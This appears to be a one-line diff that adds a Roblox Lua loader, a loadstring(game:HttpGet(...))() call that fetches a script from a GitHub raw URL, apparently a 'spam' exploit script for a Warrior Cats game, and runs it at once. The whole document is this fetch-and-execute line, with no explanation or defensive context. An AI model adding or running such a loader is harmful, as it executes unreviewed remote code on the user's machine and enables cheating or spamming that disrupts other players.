@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/warrior-cats-ultimate-edition-spam6-p837j44qobh96n.lua"))()
